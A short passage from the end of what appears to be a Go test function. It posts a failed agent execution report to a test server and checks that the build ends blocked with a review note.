	agentRequest(t, f.server.Client(), f.server.URL, "/agent/v1/report", agentToken, api.AgentReport{Id: c.Id, Generation: c.Generation, PlanHash: c.PlanHash, Sequence: 2, State: "failed", Steps: []api.ExecutionStep{}}, 204, nil)
	expectReviewNote(t, waitBlocked(t, b, path, finishBuild(commit)))
}
